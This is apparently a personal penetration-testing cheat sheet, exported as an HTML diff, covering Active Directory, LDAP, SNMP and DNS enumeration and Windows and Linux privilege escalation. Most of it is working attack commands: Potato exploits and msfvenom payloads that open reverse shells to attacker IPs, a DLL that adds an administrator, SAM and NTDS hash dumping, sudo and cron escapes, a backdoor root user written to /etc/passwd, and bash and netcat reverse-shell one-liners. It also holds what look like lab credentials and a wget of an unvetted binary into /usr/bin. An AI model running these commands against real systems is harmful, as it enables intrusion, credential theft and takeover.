+sudo neo4j console &amp;
+sudo bloodhound --no-sandbox
+# Upload ZIP → run built-in queries
+
+# PlumHound (CLI reporting)
+sudo python3 plumhound.py --easy -p &lt;neo4j_password&gt;
+sudo python3 plumhound.py -x tasks/default.tasks -p &lt;neo4j_password&gt;</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-800f-a266-f65b40e46413" class="">LDAP Enumeration</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80d0-aa69-cfb4b62b3b09" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Anonymous
+ldapsearch -x -H ldap://&lt;IP&gt; -s base
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;dc=domain,dc=local&quot; &quot; (objectClass=user)&quot; sAMAccountName
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;dc=domain,dc=local&quot; &quot;(objectClass=computer)&quot; dNSHostName
+
+# Find SPNs (Kerberoastable)
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;dc=domain,dc=local&quot; &quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot; sAMAccountName servicePrincipalName
+
+# Find AS-REP Roastable (no pre-auth)
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;dc=domain,dc=local&quot; &quot;(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot; sAMAccountName
+
+# Descriptions (often contain passwords)
+ldapsearch -x -H ldap://&lt;IP&gt; -b &quot;dc=domain,dc=local&quot; &quot;(description=*)&quot; sAMAccountName description info comment
+
+# Authenticated
+ldapsearch -x -H ldap://&lt;IP&gt; -D &quot;user@domain.htb&quot; -w &#x27;pass&#x27; -b &quot;dc=domain,dc=local&quot; &quot;(objectClass=*)&quot;
+
+# LAPS passwords
+ldapsearch -x -H ldap://&lt;IP&gt; -D &quot;user@domain&quot; -w &#x27;pass&#x27; -b &quot;dc=domain,dc=local&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd
+
+
+
+
+
+https://github.com/ropnop/windapsearch
+
+$ ./windapsearch.py -d $TARGET_DOMAIN --dc-ip $TARGET_IP -U
+
+# or
+
+$ impacket-GetADUsers $TARGET_DOMAIN/ -dc-ip $TARGET_IP -debug
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80aa-a3eb-d65c7ffff5c6" class="">RPC Enumeration</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80e3-88ee-cd3b135637d9" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">rpcclient -U &quot;&quot; -N &lt;IP&gt;
+rpcclient $&gt; enumdomusers
+rpcclient $&gt; enumdomgroups
+rpcclient $&gt; enumdomgroupmembers &lt;group_rid&gt;
+rpcclient $&gt; queryuser &lt;rid&gt;
+rpcclient $&gt; querydominfo
+rpcclient $&gt; lookupnames &lt;username&gt;
+rpcclient $&gt; getdompwinfo
+rpcclient $&gt; netshareenumall
+rpcclient $&gt; lsquery</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-802c-8dd2-ff1297286042" class="">DNS Enumeration</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-802e-ac04-f57df25ace08" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">dig axfr @&lt;DNS_IP&gt; domain.htb
+
+
+dnsrecon -d domain.htb -t axfr
+dnsrecon -d domain.htb -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt
+
+wget https://github.com/boboaung1337/exe/raw/refs/heads/main/dns &amp;&amp; sudo mv dns /usr/bin/dns &amp;&amp; sudo chmod +x /usr/bin/dns
+
+dns
+
+dns example.com -n 192.168.1.10
+
+
+
+# Reverse lookup sweep
+for ip in $(seq 1 254); do dig -x 10.10.10.$ip @&lt;DNS_IP&gt; | grep PTR; done</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80b1-929e-de616de23e80" class="">SNMP Enumeration</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80e0-8a37-ebc56e58dc91" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Brute force community strings
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt &lt;IP&gt;
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &lt;IP&gt;
+
+# Find SNMP community string
+hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.162.149
+
+hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.135.156
+
+# Enumerate SNMP
+snmpwalk -v2c -c public 192.168.162.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+snmpwalk -v2c -c public 192.168.135.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+# Walk the tree
+snmpwalk -v2c -c public &lt;IP&gt;
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25     # Windows users
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.4.2.1.2    # Running processes
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3       # Open TCP ports
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.6.3.1.2    # Installed software
+snmpwalk -v2c -c public &lt;IP&gt; NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+# SNMP Check
+snmp-check &lt;IP&gt; -c public</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-800a-94f3-df2467463690"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8096-878d-f8355c4c95b3" class="">🔓 Windows Privilege Escalation</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8085-b6b7-d39492a25f7b" class="">Automated Tools</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-807c-a7bb-c5b5785dd3d4" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># WinPEAS
+cp -r /usr/share/peass/winpeas/winPEASx64.exe . 
+
+# PowerUp
+powershell -ep bypass
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+https://github.com/411Hall/JAWS
+
+# JAWS
+IEX(New-Object Net.webclient).downloadString(&#x27;http://&lt;LHOST&gt;:&lt;LPORT&gt;/jaws-enum.ps1&#x27;)</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80e9-b0c4-e2a8e5f9f669" class="">Key Commands</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-808e-b5d3-e3cbb2cd749a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Basic info
+whoami
+whoami /groups
+net user
+net localgroup
+whoami /priv
+whoami /all
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+net user
+net localgroup
+Get-LocalUser
+Get-LocalGroupMember Administrators
+[environment]::is64bitprocess
+(Get-PSReadlineOption).HistorySavePath
+
+dir /a
+dir /a /q /s   # Includes subdirectories
+
+Get-ChildItem
+Get-ChildItem -Force
+ls -Force
+
+# Network
+ipconfig /all
+route print
+arp -a
+netstat -ano
+netsh firewall show state
+netsh advfirewall firewall show rule name=all
+netsh advfirewall export &quot;firewall.txt&quot;
+
+# PowerUp
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1
+
+powershell -ep bypass
+
+. .\PowerUp.ps1
+
+Import-Module .\PowerUp.ps1
+
+
+Get-ModifiableService -Verbose
+
+Invoke-AllChecks | Invoke-AllChecks -Verbose
+
+Get-UnquotedService
+
+Get-ModifiableServiceFile 
+
+Get-ModifiablePath
+
+Get-ModifiableService
+
+Get-ModifiableScheduledTaskFile
+
+
+# Services
+sc query type= all state= all
+sc qc &lt;SERVICE&gt;
+wmic service get name,displayname,pathname,startmode
+Get-Service | Where-Object { $_.Status -eq &quot;Running&quot; }
+
+# Scheduled Tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State
+
+# Running processes &amp; services
+tasklist /SVC
+sc query state= all
+Get-Service | Where-Object ($ _. Status -eq &#x27;Running&#x27;)
+
+
+# Registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
+reg query HKLM\SYSTEM\CurrentControlSet\Services
+
+Get-ChildItem -Path C:\ -Include sam -File -Recurse -ErrorAction SilentlyContinue
+
+reg save HKLM\SAM sam.save
+reg save HKLM\SECURITY security.save
+reg save HKLM\SYSTEM system.save
+
+
+# PowerShell History (GOLD MINE!)
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Password Hunting
+findstr /si password *.txt *.xml *.ini *.config 2&gt;nul
+dir /s *pass* == *cred* == *vnc* == *.config*
+cmdkey /list
+
+
+sudo responder -I tun0
+
+sudo tcpdump -i tun0
+
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember adminteam
+systeminfo
+route print
+netstat -ano
+Get-ItemProperty &quot;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; | select displayname
+Get-ItemProperty &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; | select displayname
+Get-Process
+
+# Hidden in Plain View
+findstr /s /i cred n:\\*.*
+
+Get-ChildItem -Recurse -Path N:\\ -Include *cred* -File
+Get-ChildItem -Recurse -Path N:\\ | Select-String &quot;cred&quot; -List
+Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\\Users\\dave\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+runas /user:backupadmin cmd
+
+(Get-PSReadlineOption).HistorySavePath
+
+type C:\\Users\\dave\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8041-b42d-c3308cd8f7e6" class="">Token Impersonation (Potato Attacks)</h3></div><div style="display:contents" dir="auto"><p id="385a083f-29df-8097-b18e-e37d52c3269b" class=""><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a></p></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80e4-bb12-d43899f7db52" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># PrintSpoofer (SeImpersonate/SeAssignPrimaryToken)
+.\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -c &quot;nc64.exe &lt;LHOST&gt; 4444 -e cmd&quot;
+.\PrintSpoofer64.exe -c &quot;nc64.exe 192.168.45.187 9999 -e powershell&quot;
+
+# On attacker machine - create reverse shell payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[your_ip] LPORT=4444 -f exe -o sh.exe
+
+.\PrintSpoofer64.exe -c &quot;C:\\path\\to\\sh.exe&quot;
+
+# GodPotato
+.\GodPotato-NET4.exe -cmd &quot;cmd /c whoami&quot;
+.\GodPotato.exe -cmd &quot;cmd /c whoami&quot;
+.\GodPotato.exe -cmd &quot;cmd /c C:\windows\Tasks\nc.exe -e powershell 10.10.14.106 9002&quot;
+.\GodPotato.exe -cmd &quot;cmd /c net user Administrator StrongPassword456&quot;
+
+# SigmaPotato
+.\SigmaPotato &quot;net user hacked 1q2w3e4r /add&quot;
+.\sigmaPotato &quot;net localgroup Administrators hacked /add&quot;
+.\SigmaPotato.exe --revshell 192.168.45.155 4444
+
+# JuicyPotatoNG
+.\JuicyPotatoNG.exe -t * -p cmd.exe
+
+# RogueWinRM
+.\RogueWinRM.exe -p &quot;nc.exe&quot; -a &quot;-e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot;
+
+https://github.com/CCob/SweetPotato
+https://github.com/zcgonvh/EfsPotato.git
+https://github.com/antonioCoco/RoguePotato
+https://github.com/ohpe/juicy-potato
+RemotePotato0.exe
+RottenPotato
+https://github.com/itm4n/PrintSpoofer
+SigmaPotato
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-801e-87f3-dbccba5a44c6" class="">Service Exploitation</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8074-ac4b-d8af4b64d08c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Unquoted service path
+wmic service get name,pathname | findstr /i /v &quot;C:\\Windows\\&quot;
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows&quot;
+
+# Place malicious exe at first space-broken path segment
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like &#x27;Running&#x27;}
+
+
+# Check file permissions on service binaries
+icacls &quot;C:\path\to\service.exe&quot;
+icacls &quot;C:\\xampp\\apache\\bin\\httpd.exe&quot;
+
+# Service binary hijack (sc.exe)
+sc config &lt;SERVICE&gt; binPath= &quot;C:\Users\&lt;USER&gt;\&lt;FILE&gt;.exe&quot;
+sc stop &lt;SERVICE&gt; &amp;&amp; sc start &lt;SERVICE&gt;
+
+# Stop service, replace, start
+sc.exe stop GPGOrchestrator
+copy payload.exe &quot;C:\\Program Files\\MilleGPG5\\GPGService.exe&quot;
+sc.exe start GPGOrchestrato
+
+
+# Check service permissions
+accesschk.exe /accepteula -uwcqv &quot;Everyone&quot; *
+accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *
+
+
+
+net start &lt;SERVICE&gt;
+net stop  &lt;SERVICE&gt;
+
+copy , rename , move -&gt; bak
+
+# Copy and rename in one command
+copy C:\source\malicious.exe &quot;C:\Program Files\legit.exe&quot;
+
+# Copy with overwrite (no prompt)
+copy /Y C:\source\file.exe D:\destination\file.exe
+
+# Backup the original file first
+copy &quot;C:\Program Files\Original Service\service.exe&quot; &quot;C:\Program Files\Original Service\service.exe.bak&quot;
+
+# Then replace with your malicious file
+copy /Y C:\temp\shell.exe &quot;C:\Program Files\Original Service\service.exe&quot;
+
+# Move with overwrite
+move /Y C:\source\file.exe D:\destination\file.exe
+
+# Copy with overwrite
+Copy-Item -Path &quot;C:\source\file.exe&quot; -Destination &quot;D:\destination\file.exe&quot; -Force
+
+# Move with overwrite
+Move-Item -Path &quot;C:\source\file.exe&quot; -Destination &quot;D:\destination\file.exe&quot; -Force
+
+
+# Service permissions (AccessChk)
+.\accesschk.exe /accepteula -quvw &quot;C:\PATH\TO\FILE\FILE.exe&quot;
+.\accesschk.exe /accepteula -uwcqv &lt;USERNAME&gt; &lt;SERVICE&gt;
+.\accesschk.exe /accepteula -uwdq C:\</code></pre></div><div style="display:contents" dir="auto"><h2 id="386a083f-29df-8016-a55e-d4934026ae11" class=""><strong>DLL Hijacking</strong></h2></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-80ba-ba63-f426e2cf9db7" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">// Compile: x86_64-w64-mingw32-gcc payload.cpp --shared -o payload.dll
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            system(&quot;net user john Password123! /add&quot;);
+            system(&quot;net localgroup administrators john /add&quot;);
+            break;
     }
-</script>
-</body>
-</html>
+    return TRUE;
+}</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80cf-a310-f3627e943703" class="">AlwaysInstallElevated</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-804e-b6f3-e5433048cc60" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Check both keys - both must be 1
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Generate and run
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80f5-bb8b-fc5f98d0ff8a" class="">Dump SAM Hashes</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8071-b115-dc4159465424" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Requires admin
+reg save hklm\sam sam.save
+reg save hklm\system system.save
+
+# Offline extraction
+impacket-secretsdump -sam sam.save -system system.save LOCAL
+
+reg.exe save hklm\\sam sam
+reg.exe save hklm\\system system
+download sam
+download system
+exit
+
+
+impacket-secretsdump -sam sam -system system local
+
+
+impacket-secretsdump eric.wallows:EricLikesRunning800@192.168.170.163 -dc-ip 192.168.170.161
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="386a083f-29df-8065-9de4-c2b3afc43e4e" class="">Change d.chambers password (z.thomas has GenericAll over d.chambers)</h3></div><div style="display:contents" dir="auto"><pre id="386a083f-29df-806b-b594-ecf56ffbfed2" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">net user d.chambers 1q2w3e4r /domain
+
+net rpc password &quot;jackie&quot; -U &quot;sub.poseidon.yzx/lisa%LisaWayToGo456&quot; -S &quot;192.168.170.162&quot;
+# Enter new password: 1q2w3e4r
+
+net rpc group addmem &quot;Remote Access&quot; &quot;&lt;username&gt;&quot; -U &quot;&lt;username&gt;%&lt;password&gt;&quot; -S $TARGET_IP
+
+
+
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-800f-8eac-ea77e214a2e5" class="">UAC Bypass</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8051-bf51-d3b550eaaed8" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">powershell.exe Start-Process cmd.exe -Verb runAs
+
+# Fodhelper.exe UAC bypass
+# Use procmon to find registry keys, then modify and run</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80a1-a21f-cff2b615f62e" class="">SeBackupPrivilege (diskshadow)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8096-b44e-daef9318fcad" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Create diskshadow script
+echo &quot;set verbose on&quot; &gt; script.txt
+echo &quot;set metadata C:\Windows\Temp\meta.cab&quot; &gt;&gt; script.txt
+echo &quot;set context clientaccessible&quot; &gt;&gt; script.txt
+echo &quot;set context persistent&quot; &gt;&gt; script.txt
+echo &quot;begin backup&quot; &gt;&gt; script.txt
+echo &quot;add volume C: alias cdrive&quot; &gt;&gt; script.txt
+echo &quot;create&quot; &gt;&gt; script.txt
+echo &quot;expose %cdrive% E:&quot; &gt;&gt; script.txt
+echo &quot;end backup&quot; &gt;&gt; script.txt
+
+diskshadow /s script.txt
+robocopy /b E:\Windows\NTDS . ntds.dit
+reg save hklm\system system
+download ntds.dit
+download system
+impacket-secretsdump -system system -ntds ntds.dit LOCAL</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-807d-9dc7-c7c2cc995296" class="">GPP Password</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8084-98a0-dde2c31a3a0d" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Find cpassword
+findstr /S /I cpassword \\&lt;FQDN&gt;\SYSVOL\*.xml
+
+# find kdbx
+Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+# Decrypt
+gpp-decrypt &lt;cpassword_value&gt;</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-8099-a420-d5c82b7b24c5"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8016-bb93-c4b4506eee10" class="">🐧 Linux Privilege Escalation</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80f7-a379-ec489eaddae0" class="">Automated Tools</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80ca-9c32-f4f3949bef7a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">https://github.com/Wiz-Works/LearnPeas
+
+# LinPEAS
+cp -r /usr/share/peass/linpeas/linpeas.sh .
+
+# LinEnum
+
+wget https://github.com/rebootuser/LinEnum/raw/refs/heads/master/LinEnum.sh
+
+curl http://&lt;LHOST&gt;/LinEnum.sh | /bin/bash
+
+# Linux Exploit Suggester
+https://github.com/The-Z-Labs/linux-exploit-suggester/raw/refs/heads/master/linux-exploit-suggester.sh
+
+wget https://github.com/boboaung1337/exe/raw/refs/heads/main/pspy64 
+
+# pspy (process monitoring)
+./pspy64 -pf -i 1000</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80d5-a61f-d8319c8f0f86" class="">Manual Enumeration</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-805b-bbfd-fbe3a76640c0" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># OS &amp; Kernel
+cat /etc/issue
+cat /etc/*-release
+uname -a
+cat /proc/version
+
+# User Info
+id
+whoami
+sudo -l
+cat /etc/passwd
+cat /etc/shadow
+
+# Processes &amp; Services
+ps aux
+ps -ef
+ss -tulpn
+netstat -nltpa
+systemctl list-units --type=service --state=running
+
+# Cron Jobs
+crontab -l
+cat /etc/crontab
+ls -la /etc/cron*
+systemctl list-timers
+
+# SUID/SGID
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -print 2&gt;/dev/null
+
+find / -perm -4000 -type f -exec ls -l {} + 2&gt;/dev/null
+
+find / -name index.php -perm -o+w -type f 2&gt;/dev/null
+
+find / -writable -type d 2&gt;/dev/null
+
+find / -perm -222 -type f 2&gt;/dev/null
+
+find / -name &quot;*.txt&quot; -o -name &quot;*.conf&quot; -o -name &quot;*.bak&quot; 2&gt;/dev/null
+
+find / -name &quot;*.bak&quot; -o -name &quot;*.old&quot; -o -name &quot;*backup*&quot; 2&gt;/dev/null
+
+grep -r &quot;password\|passwd\|pwd\|dbpass\|mysql\|root&quot; /var/www/html/ 2&gt;/dev/null | grep -v &quot;\.css\|\.js\|\.png\|\.jpg&quot;
+
+# Capabilities
+getcap -r / 2&gt;/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+
+# Env variables
+env
+echo $PATH
+
+# Mounts
+mount
+lsblk
+
+# Kernel modules
+lsmod
+modinfo $module
+
+
+# Writable files
+find / -writable -type f 2&gt;/dev/null | grep -v proc
+
+# Environment
+env
+set
+cat ~/.bash_history
+cat ~/.mysql_history
+
+# NFS
+cat /etc/exports
+showmount -e &lt;IP&gt;
+
+showmount -e &lt;IP&gt;
+
+sudo mkdir /mnt/clicker_nfs
+sudo mount -t nfs clicker.htb:/mnt/backups /mnt/clicker_nfs -o nolock
+
+sudo umount /mnt/clicker_nfs
+
+# Standard SUID Binaries to Ignore:
+
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/fusermount
+/bin/mount
+/bin/umount
+/bin/su
+
+
+dockerpeas
+
+https://github.com/stealthcopter/deepce</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-807e-9a49-e824d66d3dba" class="">Sudo Abuse (GTFOBins)</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8059-8581-d9d109e4474c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># Common sudo abuse
+sudo find . -exec /bin/sh \; -quit
+sudo vim -c &#x27;:!/bin/sh&#x27;
+sudo awk &#x27;BEGIN {system(&quot;/bin/sh&quot;)}&#x27;
+sudo python3 -c &#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;
+sudo less /etc/passwd   # then: !/bin/sh
+sudo env /bin/sh
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo su
+sudo -i</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80c2-a281-c683807ede2b" class="">Cron Job Exploitation</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8018-9322-c8c47d0ef63a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># If cron runs a writable script
+echo &#x27;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#x27; &gt;&gt; /path/to/script.sh
+# Wait, then: /tmp/rootbash -p
+
+# Wildcard injection (tar)
+echo &quot;&quot; &gt; &#x27;--checkpoint=1&#x27;
+echo &quot;&quot; &gt; &#x27;--checkpoint-action=exec=sh shell.sh&#x27;
+echo &quot;mkfifo /tmp/mini; nc &lt;LHOST&gt; 4444 0&lt;/tmp/mini | /bin/sh &gt;/tmp/mini 2&gt;&amp;1; rm /tmp/mini&quot; &gt; shell.sh</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-803d-ad21-dd461ddda5aa" class="">Writable /etc/passwd</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8072-bd6d-e8e2b4cf04a0" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">openssl passwd -1 -salt hacker password123
+echo &#x27;hacker:$1$hacker$HASH:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd
+su hacker</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8057-bed8-e702ccc0e613" class="">PATH Hijacking</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-80d9-81ce-e4a5c552ed27" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># If SUID binary calls command without full path
+echo -e &#x27;#!/bin/bash\n/bin/bash&#x27; &gt; /tmp/curl
+chmod +x /tmp/curl
+export PATH=/tmp:$PATH
+# Run the SUID binary</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80e6-bb4b-e7e76bab8d25" class="">NFS no_root_squash</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-802f-9f81-eeda43b63315" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># On target - check exports
+cat /etc/exports    # look for no_root_squash
+
+# On Kali - mount and create SUID bash
+sudo mount -t nfs &lt;IP&gt;:/share /mnt/nfs
+sudo cp /bin/bash /mnt/nfs/bash
+sudo chmod 4755 /mnt/nfs/bash
+
+# On target - execute
+/mnt/nfs/bash -p</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-8037-9420-f9028ac04e49" class="">Docker Escape</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8053-817f-fe983b6ffa4c" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all"># If user is in docker group
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-801d-85c0-ddd2a395e188" class="">Linux Capabilities</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-807c-ada9-da7a995a3ebf" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">getcap -r / 2&gt;/dev/null
+
+# cap_setuid (python)
+python -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;
+
+# cap_dac_read_search (tar)
+tar -cvf /dev/null /etc/shadow
+
+# cap_sys_ptrace - inject into root process</code></pre></div><div style="display:contents" dir="auto"><hr id="384a083f-29df-803d-bfb0-cb1988134972"/></div><div style="display:contents" dir="auto"><h2 id="384a083f-29df-8074-9aa0-f371ba4b2291" class="">💻 Reverse Shells &amp; Payloads</h2></div><div style="display:contents" dir="auto"><h3 id="384a083f-29df-80bb-894c-fead65d6cbb6" class="">Reverse Shells</h3></div><div style="display:contents" dir="auto"><pre id="384a083f-29df-8004-b329-f01ada0cc41a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">webshells
+
+nishang
+
+base64 / url encode
+
+# Bash
+
+bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1
+
+bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/4444 0&gt;&amp;1&#x27;
+
+bash -c &#x27;exec 5&lt;&gt;/dev/tcp/192.168.45.220/443;cat &lt;&amp;5|while read line;do $line 2&gt;&amp;5 &gt;&amp;5;done&#x27;
+
+bash -c &#x27;0&lt;&amp;69-;exec 69&lt;&gt;/dev/tcp/192.168.45.220/4444;sh &lt;&amp;69 &gt;&amp;69 2&gt;&amp;69&#x27;
+
+
+
+netcat &lt;LHOST&gt; 4444|bash
+
+nc -e /bin/bash &lt;LHOST&gt; 4444
+
+nc &lt;LHOST&gt; 80 -e /bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; 4444 &gt;/tmp/f
+
